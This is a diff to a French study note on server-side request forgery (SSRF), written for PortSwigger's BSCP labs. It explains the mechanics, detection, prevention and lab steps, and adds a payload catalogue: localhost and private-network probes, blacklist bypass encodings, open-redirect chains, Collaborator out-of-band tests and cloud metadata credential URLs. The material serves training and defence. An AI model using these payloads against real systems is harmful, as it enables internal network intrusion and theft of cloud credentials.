@@ -7,60 +7,144 @@ statut: en cours
 
 ## En bref
 - La SSRF est une faille qui permet à un attaquant d'amener une application côté serveur à envoyer des requêtes vers une destination non prévue.
-- Le serveur peut être amené à se connecter à des services à usage interne, au sein de l'infrastructure.
-- Il peut aussi être forcé à se connecter à des systèmes externes.
-- L'impact est qu'une fuite de données sensibles est possible.
+- Le serveur peut être amené à se connecter à des services à usage interne, au sein de l'infrastructure, ou à des systèmes externes.
+- Fonctionnement : le client envoie une valeur (URL, nom d'hôte, chemin) à l'application. C'est ensuite l'application, et non le navigateur du client, qui envoie la requête à la destination. La destination voit l'adresse du serveur et lui accorde la confiance qui va avec.
 ![](SSRF.png)
 
 ## Impact
-- Une attaque SSRF réussie peut entraîner des actions non autorisées ou un accès non autorisé aux données au sein d'une organisation.
+- Une attaque SSRF réussie peut entraîner des actions non autorisées ou un accès non autorisé aux données sensibles au sein d'une organisation.
 - Cela peut se produire dans l'application elle-même, ou sur d'autres systèmes back-end avec lesquels elle communique.
 - Dans certains cas, la SSRF peut permettre à un attaquant d'exécuter des commandes arbitraires.
 - Ces attaques peuvent sembler provenir de l'organisation qui héberge l'application vulnérable (l'adresse IP source est celle du serveur).
 
 ## Types et variantes
-- Les attaques SSRF exploitent souvent des relations de confiance pour étendre l'attaque à partir de l'application vulnérable : la confiance envers le serveur lui-même, ou envers d'autres systèmes back-end de la même organisation.
+- Les attaques SSRF exploitent souvent des relations de confiance pour étendre l'attaque à partir de l'application vulnérable : la confiance envers le serveur lui-même, ou envers d'autres systèmes back-end de la même organisation. Exemples concrets : une interface d'administration accessible sans authentification depuis le bouclage, un contrôle d'accès placé en amont et contourné par une requête interne, un port d'administration distinct (voir [[SSRF-serveur-local]]). Le contrôle d'accès lui-même est traité dans [[Access-control]].
 - Il est fréquent de rencontrer des applications vulnérables qui intègrent des mesures de protection contre l'exploitation. Ces mesures peuvent souvent être contournées.
 
-| Type | Idée clé | Note | Niveau |
-| --- | --- | --- | --- |
-| Contre le serveur local | `stockApi=http://localhost/admin` | [[SSRF-serveur-local]] | Apprentice |
-| Contre d'autres systèmes back-end | Adresses privées, balayage Intruder | [[SSRF-systemes-back-end]] | Apprentice |
-| Filtre par liste noire | `127.1`, double encodage | [[SSRF-filtre-liste-noire]] | Practitioner |
-| Filtre par liste blanche | `@`, `#`, DNS, encodage | [[SSRF-filtre-liste-blanche]] | Expert |
-| Redirection ouverte | Domaine autorisé qui redirige | [[SSRF-redirection-ouverte]] | Practitioner |
-| SSRF aveugle | Détection hors bande (OAST) | [[SSRF-aveugle]] | Practitioner, Expert |
-| Surfaces cachées | URL partielles, XML, `Referer` | [[SSRF-surfaces-cachees]] | Practitioner |
+### Schéma, hôte, port, chemin
+Une URL se décompose en quatre parties que le filtre peut contrôler, ou oublier de contrôler, séparément : le schéma (`http`, `https`, autres), l'hôte (nom ou adresse), le port et le chemin. Toute la logique de contournement en dépend : une liste noire sur l'hôte se contourne par une autre représentation de l'adresse, un filtre sur le chemin par l'encodage, un filtre sur le port par un port non listé. Il faut donc tester les quatre parties l'une après l'autre, pas en bloc.
+
+### Réponse visible, aveugle, semi-aveugle
+- SSRF complète : la réponse de la destination est renvoyée au client.
+- SSRF aveugle : aucune réponse n'est visible, seule une interaction externe (Collaborator) prouve la requête.
+- SSRF semi-aveugle : pas de contenu, mais des indices indirects (code de statut, durée, taille de la réponse, message d'erreur) permettent de distinguer hôte joignable, filtré ou inexistant.
+
+| Type | Idée clé | Signal d'observation | Note | Niveau |
+| --- | --- | --- | --- | --- |
+| Contre le serveur local | Valeur pointant vers le bouclage | Contenu de l'interface interne | [[SSRF-serveur-local]] | Apprentice |
+| Contre d'autres systèmes back-end | Adresses privées, balayage Intruder | Un statut ou une taille qui se distingue | [[SSRF-systemes-back-end]] | Apprentice |
+| Filtre par liste noire | Autre représentation de l'adresse, encodage du chemin | Passage de bloqué à accepté | [[SSRF-filtre-liste-noire]] | Practitioner |
+| Filtre par liste blanche | Confusion d'analyse de l'URL, encodage | Passage de refusé à accepté | [[SSRF-filtre-liste-blanche]] | Expert |
+| Redirection ouverte | Domaine autorisé qui redirige | Contenu de la destination finale | [[SSRF-redirection-ouverte]] | Practitioner |
+| SSRF aveugle | Détection hors bande | Interaction DNS ou HTTP dans Collaborator | [[SSRF-aveugle]] | Practitioner (lab 5), Expert (lab 7) |
+| Surfaces cachées | URL partielles, XML, `Referer` | Variable selon la surface | [[SSRF-surfaces-cachees]] | Practitioner |
+
+Dans la ligne aveugle, le lab 5 relève de Practitioner (détection simple) et le lab 7 d'Expert (exploitation d'un service interne vulnérable, via la SSRF aveugle).
 
 ## Comment détecter
-- Repérer tout paramètre, corps ou en-tête qui contient une URL, un nom d'hôte ou un chemin (`url`, `stockApi`, `path`, `redirect`, `webhook`, `callback`, `Referer`).
-- Remplacer la valeur par `http://localhost/` ou par une adresse Burp Collaborator, puis comparer la réponse et surveiller les interactions.
+- Repérer tout paramètre, corps ou en-tête qui contient une URL, un nom d'hôte ou un chemin : `url`, `stockApi`, `path`, `redirect`, `webhook`, `callback`, champs JSON et XML, en-têtes `Referer`, `Host`, `X-Forwarded-Host`, import par URL, génération de PDF, aperçu de lien, avatar distant (voir [[SSRF-surfaces-cachees]]).
+- Comparer à trois points pour chaque emplacement : la valeur d'origine, un hôte local (`http://localhost/`), un hôte inexistant. La différence entre les trois distingue filtré, non joignable et joignable.
+- Signaux à noter à chaque essai : code de statut, longueur, durée de réponse, texte d'erreur, interaction DNS seule ou DNS plus HTTP dans Collaborator.
 - Si la réponse n'affiche rien mais que Collaborator reçoit une interaction : SSRF aveugle (voir [[SSRF-aveugle]]).
-- Si seule une requête DNS arrive : la requête HTTP est probablement filtrée en sortie.
-- Penser aux surfaces moins évidentes : voir [[SSRF-surfaces-cachees]].
+- Si seule une requête DNS arrive, deux explications sont possibles et aucune n'est certaine : la requête HTTP sortante est filtrée, ou le serveur a seulement résolu le nom pour le valider sans envoyer de requête ensuite.
 
 ## Comment exploiter (principe)
 1. Identifier le paramètre qui déclenche la requête côté serveur.
-2. Vérifier si la réponse est visible (SSRF classique) ou non (SSRF aveugle).
-3. Viser en priorité le serveur lui-même (`localhost`) puis les plages privées (`192.168.0.0/16`, `10.0.0.0/8`, `172.16.0.0/12`).
-4. Si un filtre bloque la requête, identifier sa nature (liste noire ou liste blanche) et appliquer la technique de contournement correspondante.
+2. Déterminer si la réponse est visible (SSRF complète), absente (aveugle) ou indirecte (semi-aveugle).
+3. Viser en priorité le serveur lui-même (`localhost`) puis les plages privées (`192.168.0.0/16`, `10.0.0.0/8`, `172.16.0.0/12`), en variant aussi les ports.
+4. Si un filtre bloque la requête, identifier sa nature (liste noire ou liste blanche), puis la partie de l'URL concernée (schéma, hôte, port, chemin), et appliquer la technique de contournement correspondante.
 5. Lire le HTML de l'interface trouvée pour repérer l'action à déclencher, puis la rejouer via la SSRF.
+
+Limites à garder en tête, selon la cible :
+- Le client HTTP du serveur accepte souvent seulement `http` et `https`.
+- La méthode et les en-têtes ne sont généralement pas contrôlables : la requête est souvent un GET. Dans les labs, la suppression passe par un GET, ce qui n'est pas le cas général.
+- Une réponse non textuelle ou volumineuse peut être tronquée ou rejetée.
+- Une validation faite sur une première résolution DNS peut être suivie d'une seconde résolution à l'envoi (rebinding).
 
 Détails dans [[SSRF-serveur-local]] et [[SSRF-systemes-back-end]].
 
+## Catalogue de payloads par variante
+Les majuscules et les crochets sont des espaces réservés. À utiliser uniquement sur des labs ou des cibles autorisées.
+
+### Serveur local
+| Payload | Contexte | Signal attendu | Limites |
+| --- | --- | --- | --- |
+| `stockApi=http://localhost/admin` | Paramètre contenant une URL complète | Interface d'administration dans la réponse | Bloqué si filtre sur `localhost` |
+| URL de suppression lue dans le HTML | Action à déclencher | Action effectuée | GET seulement, chemin tiré du HTML |
+| `http://localhost:PORT/admin` avec PORT parmi 80, 8080, 8000, 8443 | Interface sur un autre port | Réponse différente selon le port | Balayage lent |
+| `http://localhost/console`, `/actuator` | Chemins sensibles | Réponse différente de 404 | Dépend de la technologie |
+
+### Systèmes back-end internes
+| Payload | Contexte | Signal attendu | Limites |
+| --- | --- | --- | --- |
+| `http://192.168.0.§1§:8080/admin`, Numbers de 1 à 255 | Balayage Intruder | Un seul statut différent | Plage et port supposés connus |
+| `http://10.0.0.§1§/` et `http://172.16.0.§1§/` | Autres plages privées | Statut ou durée différents | Espace à balayer très large |
+| `http://192.168.0.1:§80§/` avec liste de ports | Port inconnu | Statut ou durée différents | Bruit élevé |
+| Mesure du temps de réponse | Aucune réponse visible | Rapide : hôte atteint ; lent : filtré | Interprétation incertaine |
+
+### Aveugle hors bande
+| Payload | Contexte | Signal attendu | Limites |
+| --- | --- | --- | --- |
+| `Referer: http://BURP-COLLABORATOR-SUBDOMAIN` | Logiciel d'analyse qui récupère le `Referer` | Interactions DNS puis HTTP après "Poll now" | Traitement asynchrone, patienter |
+| `stockApi=http://BURP-COLLABORATOR-SUBDOMAIN/` | Paramètre URL sans réponse visible | Interaction DNS et HTTP | Dans les labs, serveur public par défaut seulement |
+| `Host: ...` ou `X-Forwarded-Host: BURP-COLLABORATOR-SUBDOMAIN` | En-têtes que le serveur peut résoudre | Interaction DNS | Dépend de l'infrastructure ([[HTTP-Host-header]]) |
+| URL Collaborator dans un champ XML, un webhook, un PDF | Surfaces cachées | Interaction DNS ou HTTP | Dépend de la fonctionnalité ([[XXE-injection]] pour le XML) |
+
+### Contournement de liste noire
+| Payload | Signal attendu | Limites |
+| --- | --- | --- |
+| `http://127.0.0.1/` | Bloqué (confirme le filtre) | Aucune |
+| `http://127.1/` | Passe le filtre | Le client doit accepter la forme abrégée |
+| `http://127.1/%2561dmin` | Le chemin passe (double encodage) | Suppose un décodage en deux temps |
+| `http://2130706433/` (décimal) | Passe le filtre | Dépend de l'analyseur |
+| `http://017700000001/` (octal), `http://0x7f000001/` (hexadécimal) | Idem | Selon l'analyseur |
+| `http://[::1]/` (IPv6) | Idem | Le service doit écouter en IPv6 |
+| `http://0/` ou `http://0.0.0.0/` | Idem | Comportement variable selon le système |
+| `http://127.1/%61dmin` (encodage simple), `http://127.1/ADMIN` (casse) | Le chemin passe | Souvent décodé par le filtre, chemins sensibles à la casse |
+| `http://spoofed.burpcollaborator.net/` | Nom censé résoudre vers `127.0.0.1` d'après la documentation PortSwigger | Domaine d'exemple ; interdit hors serveur par défaut dans les labs |
+
+### Liste blanche
+Les formes génériques (`@`, `#`, sous-domaine, encodage) sont décrites dans [[SSRF-filtre-liste-blanche]] ; elles ne sont pas répétées ici.
+
+### Redirection ouverte
+| Payload | Contexte | Signal attendu | Limites |
+| --- | --- | --- | --- |
+| `stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin` | Chemin relatif accepté, redirection ouverte via `path` | Page d'administration interne renvoyée | Le client doit suivre la redirection |
+| Même forme avec `/admin/delete?username=carlos` | Action de suppression | Action effectuée | Valeurs propres au lab |
+| `.../redirect?url=http://BURP-COLLABORATOR-SUBDOMAIN` | Test préalable de la redirection | Interaction ou en-tête `Location` | Serveur par défaut dans les labs |
+
+### Métadonnées cloud (cible réelle seulement)
+| Payload | Contexte | Signal attendu | Limites |
+| --- | --- | --- | --- |
+| `http://169.254.169.254/latest/meta-data/` | AWS, métadonnées version 1 | Liste de clés | La version 2 exige un jeton obtenu par PUT, souvent infaisable via GET |
+| `.../iam/security-credentials/` sous le chemin précédent | Identifiants du rôle | Nom du rôle puis identifiants | Données très sensibles : preuve minimale seulement |
+| `http://metadata.google.internal/computeMetadata/v1/` | Google Cloud | Réponse avec l'en-tête `Metadata-Flavor: Google` | En-tête non contrôlable via une SSRF simple |
+| `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | Azure | Réponse avec l'en-tête `Metadata: true` | Idem |
+| Schémas `file://`, `gopher://`, `dict://` | Client acceptant d'autres schémas | Lecture de fichier ou octets bruts | Rarement acceptés |
+
 ## Pièges et points d'attention BSCP
+Attendu dans les labs :
 - Un filtre peut empiler plusieurs défenses : contourner l'hôte, puis le chemin, séparément.
 - Si une URL externe est refusée mais que le domaine local passe, penser à la redirection ouverte.
-- Dans les labs, les interactions avec des systèmes externes arbitraires sont bloquées : utiliser le serveur public par défaut de Burp Collaborator.
-- Hors énoncé de la formation (à garder en tête sur cible réelle) : points de métadonnées cloud (`http://169.254.169.254/`), schémas autres que HTTP (`file://`, `gopher://`, `dict://`), rebinding DNS.
+- Les interactions avec des systèmes externes arbitraires sont bloquées par le pare-feu de l'Academy : utiliser le serveur public par défaut de Burp Collaborator.
+- Ne pas se limiter à `stockApi` : le lab 5 montre qu'un en-tête (`Referer`) peut être la porte d'entrée.
+- Certains labs exigent Burp Suite Professional (Collaborator, Intruder rapide).
+- Relire la réponse complète, pas seulement le statut.
+- À l'examen, la SSRF sert souvent de maillon dans une chaîne (accès à un compte ou à des fichiers), pas de fin en soi.
+
+Cible réelle (hors énoncé de la formation) :
+- Points de métadonnées cloud et schémas autres que HTTP (voir le catalogue).
+- Rebinding DNS : la validation et la requête peuvent résoudre le nom séparément.
+- Pas de limite de pare-feu comme dans les labs : un domaine contrôlé peut servir, sur autorisation.
 
 ## Prévention
 - Préférer une liste blanche stricte de destinations (hôtes, ports, chemins) plutôt qu'une liste noire.
-- Valider le schéma (HTTP et HTTPS uniquement) et résoudre le nom d'hôte côté serveur avant la requête, puis vérifier que l'adresse résolue n'est pas privée ni de bouclage.
+- Valider le schéma (HTTP et HTTPS uniquement) et résoudre le nom d'hôte côté serveur avant la requête, vérifier que l'adresse résolue n'est pas privée ni de bouclage, puis utiliser cette adresse épinglée pour la requête (contre le rebinding).
 - Désactiver le suivi des redirections ou revalider chaque redirection.
-- Ne jamais renvoyer au client la réponse brute de la requête côté serveur.
-- Segmenter le réseau et authentifier les services internes : ne pas se reposer sur la seule topologie ou sur la provenance locale d'une requête.
+- Ne pas renvoyer au client la réponse brute : cela réduit l'impact mais ne supprime pas la SSRF, la requête reste émise.
+- Segmenter le réseau et authentifier les services internes, dont les métadonnées cloud (version 2 avec jeton) : ne pas se reposer sur la seule topologie ou sur la provenance locale d'une requête.
 - Bloquer les connexions sortantes inutiles depuis le serveur d'applications.
+- Journaliser les requêtes sortantes et alerter sur les destinations inhabituelles.
 
 ## Labs PortSwigger
 - [x] Apprentice ✅ 2026-10-07
@@ -172,19 +256,8 @@ Le site utilise un logiciel d'analyse qui récupère l'URL indiquée dans l'en-t
 5. Dans l'onglet Collaborator, cliquez sur « Poll now » : une interaction DNS contient le nom de l'utilisateur en sous-domaine.
 6. Soumettez ce nom d'utilisateur pour valider le lab.
 
-## Mes notes
-- 
-
 ## Liens
-- [[SSRF-serveur-local]]
-- [[SSRF-systemes-back-end]]
-- [[SSRF-filtre-liste-noire]]
-- [[SSRF-filtre-liste-blanche]]
-- [[SSRF-redirection-ouverte]]
-- [[SSRF-aveugle]]
-- [[SSRF-surfaces-cachees]]
-- [[Command-injection]]
-- [[XXE-injection]]
-- [[HTTP-Host-header]]
-- [[Access-control]]
-- [[Web-cache-poisoning]]
+- [[Command-injection]] : injection de commande, liée au lab 7 (Shellshock).
+- [[XXE-injection]] : SSRF déclenchée par une entité externe XML.
+- [[HTTP-Host-header]] : en-tête `Host` comme point d'entrée.
+- [[Access-control]] : confiance accordée aux requêtes locales.
